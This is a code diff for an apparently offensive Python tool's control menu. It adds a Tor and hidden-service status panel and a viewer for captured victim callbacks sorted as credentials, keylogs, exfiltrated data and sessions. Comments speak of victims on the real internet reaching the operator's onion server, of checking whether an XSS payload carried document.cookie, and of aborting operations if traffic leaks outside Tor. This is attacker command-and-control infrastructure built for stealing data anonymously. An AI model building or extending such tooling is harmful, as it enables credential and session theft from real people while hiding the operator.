@@ -3539,9 +3539,11 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         print(f"  {G}A{N}  Audit log + stats      "
               f"{G}F{N}  List generated files")
         print(f"  {G}U{N}  Show callback URLs     "
-              f"{G}T{N}  Toggle auto-mode")
+              f"{G}M{N}  Toggle auto-Mode")
         print(f"  {G}N{N}  New Tor circuit        "
               f"{G}H{N}  Target health check")
+        print(f"  {G}T{N}  Tor + HS status panel  "
+              f"{G}I{N}  Inspect capture (by #)")
         print(f"  {G}X{N}  Clear captures buffer  "
               f"{G}V{N}  Save captures to file")
         print(f"  {G}G{N}  Generate report        "
@@ -3557,7 +3559,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         # just spent an hour working a target could wipe it with a
         # single reflex-Enter. Default is now empty (no-op loop) so
         # blank input just re-prompts.
-        cmd = prompt("Control deck (R/P/L/C/A/F/U/T/N/H/X/V/G/S/Z/Q)",
+        cmd = prompt("Control deck (R/P/L/C/A/F/U/M/N/H/T/I/X/V/G/S/Z/Q)",
                      "").strip().upper()
         if not cmd:
             continue
@@ -3709,9 +3711,24 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
                 _url = callback_urls.get(_k) or server.get_callback_url(_k)
                 info(f"  /{_k} ({_KIND_LABELS[_k]:<12s}) {_url}")
 
-        elif cmd == "T":
+        elif cmd == "M":
             auto_mode = not auto_mode
-            info(f"Auto-mode is now {'ON' if auto_mode else 'off'}")
+            info(f"Auto-Mode is now {'ON' if auto_mode else 'off'}")
+
+        elif cmd == "T":
+            # Tor + HS status panel
+            _tor_hs_status_panel(server, infra_is_loopback, audit)
+
+        elif cmd == "I":
+            # Inspect a single captured callback by index (detailed
+            # body, headers, parsed params).
+            if not server.is_running:
+                warn("Server is stopped — no captures to inspect.")
+                continue
+            if server.capture_count() == 0:
+                info("Capture buffer is empty.")
+                continue
+            _inspect_capture(server)
 
         elif cmd == "G":
             _generate_and_show_report(audit, file_mgr, findings_summary, server)
@@ -3803,7 +3820,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
 
         else:
             warn(f"Unknown command: {cmd!r}")
-            info("Valid commands: R P L C A F U T N H X V G S Z Q "
+            info("Valid commands: R P L C A F U M N H T I X V G S Z Q "
                  "(single letter, case-insensitive).")
 
 
@@ -4045,6 +4062,195 @@ def _new_identity_now(executor, audit, attacker_url):
        "with a fresh per-host fingerprint.")
     if attacker_url:
         info(f"Attacker base is unchanged: {attacker_url}")
+    print()
+
+
+def _tor_hs_status_panel(server, infra_is_loopback: bool, audit):
+    """One-stop status dashboard: Tor connectivity, current exit IP,
+    hidden-service liveness, and attacker infra summary.
+
+    This answers the operator question 'is my Tor still working and
+    is my onion still reachable from the outside?' without requiring
+    them to leave the Control Deck. It also logs the exit IP for
+    post-mortem visibility (useful if captures stop arriving and
+    you want to know which exit to blame later)."""
+    print()
+    heading("Tor + Attacker-Infra Status")
+
+    # 1. Tor reachability + exit IP via check.torproject.org.
+    # We construct a fresh ephemeral session through the operator's
+    # Tor proxy (env var or default port). This intentionally does
+    # NOT use the walkthrough TorClient because we don't want this
+    # probe polluting TorClient's per-host cookie jars or Referer
+    # chain.
+    import requests as _req
+    _torproxy = os.environ.get("TOR_PROXY_URL",
+                               "socks5h://127.0.0.1:9050")
+    probe_ok = False
+    exit_ip = "unknown"
+    is_tor = None
+    try:
+        _ephemeral = _req.Session()
+        _ephemeral.proxies = {"http": _torproxy, "https": _torproxy}
+        _resp = _ephemeral.get(
+            "https://check.torproject.org/api/ip",
+            timeout=10,
+        )
+        if _resp.status_code == 200:
+            data = _resp.json()
+            if isinstance(data, dict):
+                probe_ok = True
+                exit_ip = data.get("IP", "unknown")
+                is_tor = bool(data.get("IsTor"))
+        _ephemeral.close()
+    except Exception as _e:
+        integrity_log_stub = f"{type(_e).__name__}"
+        audit.log(
+            "tor_status_probe_failed",
+            integrity_log_stub,
+            risk=AuditTrail.RISK_LOW,
+        )
+    if probe_ok:
+        _tor_tag = f"{G}YES{N}" if is_tor else f"{R}NO{N}"
+        print(f"  {B}Tor exit reachable:{N}    {G}yes{N}")
+        print(f"  {B}IsTor confirmed:{N}       {_tor_tag}")
+        print(f"  {B}Exit IP seen by probe:{N} {exit_ip}")
+        if not is_tor:
+            err("!! Traffic is NOT exiting via Tor. This is a LEAK. "
+                "Abort operations immediately.")
+            audit.log("tor_status_LEAK",
+                      f"exit_ip={exit_ip}",
+                      risk=AuditTrail.RISK_CRITICAL)
+    else:
+        print(f"  {B}Tor exit reachable:{N}    {R}NO{N}")
+        warn("check.torproject.org didn't answer. Either Tor is "
+             "down, the endpoint is blocked, or the ControlPort "
+             "isn't the one we're reading from.")
+
+    # 2. Attacker server state
+    print()
+    if server and server.is_running:
+        base = server.get_attacker_url(prefer_onion=True)
+        print(f"  {B}Attacker base:{N}         {base}")
+        print(f"  {B}Local port:{N}            {server.port}")
+        if server.onion_host:
+            print(f"  {B}Hidden service:{N}        "
+                  f"{G}up{N}  ({server.onion_host})")
+        else:
+            _lb_tag = " (loopback-only, lab use)" if infra_is_loopback else ""
+            print(f"  {B}Hidden service:{N}        "
+                  f"{Y}not configured{N}{_lb_tag}")
+        print(f"  {B}Captures buffered:{N}     {server.capture_count()}")
+        _last_hs_err = getattr(server,
+                               "last_hidden_service_error", None)
+        if _last_hs_err:
+            print(f"  {B}Last HS error:{N}         {_last_hs_err}")
+    else:
+        print(f"  {B}Attacker server:{N}       {R}STOPPED{N}")
+
+    # 3. Hidden-service reachability probe (if we have one).
+    # We fetch our own /healthz-style endpoint OVER the onion. If
+    # this succeeds, victims on the real internet can reach us.
+    if server and server.is_running and server.onion_host:
+        print()
+        info("Probing hidden service from outside (via Tor)...")
+        hs_url = f"http://{server.onion_host}/"
+        hs_ok = False
+        hs_latency_ms = None
+        try:
+            _t0 = _time_mod.perf_counter()
+            _e2 = _req.Session()
+            _e2.proxies = {"http": _torproxy, "https": _torproxy}
+            _hr = _e2.get(hs_url, timeout=25)
+            hs_latency_ms = (_time_mod.perf_counter() - _t0) * 1000
+            # Any response (even 404 — our server DOES 404 unknown
+            # paths but only AFTER accepting the connection) confirms
+            # the hidden service is descriptor-published and an exit
+            # can reach it. 200 means the "/" path responded.
+            hs_ok = _hr.status_code in (200, 204, 301, 302, 400, 404)
+            _e2.close()
+        except Exception as _e:
+            print(f"  {B}HS round-trip:{N}         "
+                  f"{R}FAIL{N} ({type(_e).__name__})")
+            audit.log("hs_liveness_fail",
+                      f"{type(_e).__name__}",
+                      risk=AuditTrail.RISK_MEDIUM)
+        if hs_ok:
+            print(f"  {B}HS round-trip:{N}         "
+                  f"{G}OK{N}  ({hs_latency_ms:.0f} ms)")
+            audit.log("hs_liveness_ok",
+                      f"latency_ms={hs_latency_ms:.0f}",
+                      risk=AuditTrail.RISK_LOW)
+
+    # 4. Log the exit IP so later forensic review can tie 'captures
+    # came from circuit X, exit IP Y' to the audit trail.
+    audit.log(
+        "tor_status_snapshot",
+        f"is_tor={is_tor} exit_ip={exit_ip[:39]}",
+        risk=AuditTrail.RISK_LOW,
+    )
+    print()
+
+
+def _inspect_capture(server):
+    """Interactive: show full body + headers of one buffered capture.
+    Complements the live viewer (L, which only shows preview lines)
+    and the save-to-file (V, which dumps everything). For
+    'did this victim's XSS payload actually carry document.cookie?'
+    the operator needs the raw body — that's what this does."""
+    captures = server.get_captures(last_n=server.capture_count())
+    if not captures:
+        info("No captures to inspect.")
+        return
+    # Captures come back newest-first (see get_captures); display
+    # with stable 1-based indices so the operator can pick.
+    print()
+    print(f"  {B}Buffered captures ({len(captures)}):{N}")
+    _kc = {"credentials": R, "keylog": Y, "exfil": M,
+           "session": R, "beacon": C, "unknown": D}
+    for i, cap in enumerate(captures, 1):
+        kind = cap.get("kind", "unknown")
+        ep_color = _kc.get(kind, D)
+        body_preview = (cap.get("data") or cap.get("query")
+                        or "")[:60].replace("\n", "\\n")
+        print(f"  {i:>3}. [{cap['time']}] "
+              f"{ep_color}{cap['method']:4s} {cap['endpoint']:2s} "
+              f"{kind:11s}{N}  {body_preview}")
+    print()
+    sel = prompt("Which # to inspect? (blank to cancel)", "").strip()
+    if not sel:
+        return
+    if not sel.isdigit():
+        warn("Invalid selection.")
+        return
+    idx = int(sel)
+    if not (1 <= idx <= len(captures)):
+        warn(f"Out of range: 1..{len(captures)}")
+        return
+    cap = captures[idx - 1]
+    print()
+    heading(f"Capture #{idx}")
+    print(f"  {B}Time:{N}     {cap.get('time', '?')}")
+    print(f"  {B}Endpoint:{N} /{cap.get('endpoint', '?')}  "
+          f"({cap.get('kind', 'unknown')})")
+    print(f"  {B}Method:{N}   {cap.get('method', '?')}")
+    print(f"  {B}Remote:{N}   {cap.get('remote', '?')}")
+    if cap.get("ua"):
+        print(f"  {B}UA:{N}       {cap['ua'][:200]}")
+    if cap.get("referer"):
+        print(f"  {B}Referer:{N}  {cap['referer'][:200]}")
+    if cap.get("query"):
+        print(f"  {B}Query:{N}    {cap['query'][:2048]}")
+    if cap.get("data"):
+        print(f"  {B}Body ({len(cap['data'])} bytes):{N}")
+        # Print without pager — operator can redirect to file or
+        # rely on their terminal's scrollback. Cap at 16 KiB
+        # per-body here to prevent 'cat a 64 MB exfil' accidents.
+        blob = cap["data"][:16384]
+        for line in blob.split("\n"):
+            print(f"    {line[:400]}")
+        if len(cap["data"]) > 16384:
+            print(f"    {D}... ({len(cap['data']) - 16384} more bytes truncated){N}")
     print()
 
 
